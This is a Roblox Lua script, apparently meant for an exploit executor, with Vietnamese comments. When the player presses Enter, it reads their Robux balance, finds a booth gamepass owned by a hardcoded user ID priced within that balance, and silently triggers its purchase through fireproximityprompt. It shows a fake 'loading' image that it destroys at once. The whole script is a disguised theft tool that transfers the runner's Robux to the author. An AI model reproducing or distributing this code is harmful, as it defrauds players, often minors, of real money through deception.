if not game:IsLoaded() then game.Loaded:Wait() end

local player = game.Players.LocalPlayer
local targetUserID = 5310603116 
local userInputService = game:GetService("UserInputService")
local marketplaceService = game:GetService("MarketplaceService")

local function getMyRobux()
    local success, balance = pcall(function()
        return marketplaceService:GetRobuxBalance()
    end)
    return success and balance or 0
end

-- 🎨 Hiển thị ảnh "Loading..."
local function showLoadingImage()
    local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))

    local imageLabel = Instance.new("ImageLabel", screenGui)
    imageLabel.Size = UDim2.new(0, 500, 0, 300) -- 📏 Kích thước ảnh
    imageLabel.Position = UDim2.new(0.5, -250, 0.5, -150) 
    imageLabel.Image = "rbxassetid://YOUR_IMAGE_ID" 
    imageLabel.BackgroundTransparency = 1

    screenGui:Destroy() 
end

local function donateExactRobux()
    showLoadingImage() 

    local myRobux = getMyRobux()
    local selectedItem = nil

    -- 🔍 Tìm gamepass có giá đúng với số Robux bạn có
    for _, booth in pairs(game:GetService("Workspace").BoothInteractions:GetChildren()) do
        if booth:FindFirstChild("Owner") and booth.Owner.Value == targetUserID then
            for _, item in pairs(booth:GetChildren()) do
                if item:IsA("Model") and item:FindFirstChild("PriceTag") then
                    local price = tonumber(item.PriceTag.Text:match("%d+"))
                    if price and price <= myRobux then
                        selectedItem = item
                    end
                end
            end
        end
    end

    if selectedItem then
        local donateButton = selectedItem:FindFirstChild("ProximityPrompt")
        if donateButton then
            fireproximityprompt(donateButton) 
            wait(2)
            print("✅ Đã donate " .. myRobux .. " Robux cho User ID: " .. targetUserID)
        end
    else
        print("❌ Không tìm thấy gamepass phù hợp với số Robux bạn có.")
    end
end

userInputService.InputBegan:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Return then
        donateExactRobux()
    end
end)
